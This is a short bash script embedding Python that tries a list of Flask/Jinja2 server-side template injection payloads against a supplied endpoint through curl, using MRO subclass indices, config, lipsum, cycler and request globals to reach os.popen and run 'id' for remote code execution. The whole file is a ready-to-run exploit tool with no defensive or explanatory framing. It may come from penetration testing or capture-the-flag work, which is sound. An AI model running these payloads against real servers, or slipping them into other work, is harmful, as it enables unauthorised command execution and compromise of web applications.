#!/bin/bash
# Flask SSTI — Brute force common MRO subclass indices for RCE
# Usage: bruteforce_mro.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

python3 -c "
import subprocess, sys

endpoint = '$ENDPOINT'

# Common Popen/os._wrap_close indices across Python versions
payloads = [
    # os._wrap_close -> popen
    \"{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}\",
    \"{{''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('id').read()}}\",
    \"{{''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['popen']('id').read()}}\",
    # Direct Popen
    \"{{''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()[0].decode()}}\",
    \"{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].decode()}}\",
    # config + os
    \"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\",
    # lipsum
    \"{{lipsum.__globals__['os'].popen('id').read()}}\",
    # cycler
    \"{{cycler.__init__.__globals__.os.popen('id').read()}}\",
    # request
    \"{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}\",
]

for i, p in enumerate(payloads):
    r = subprocess.run(
        ['curl', '-s', '-G', '--data-urlencode', f'name={p}', endpoint, '--max-time', '8'],
        capture_output=True, text=True, timeout=15
    )
    if 'uid=' in r.stdout:
        print(f'PAYLOAD_{i}_SUCCESS')
        print(r.stdout[:500])
        sys.exit(0)

print('ALL_PAYLOADS_FAILED')
" 2>/dev/null
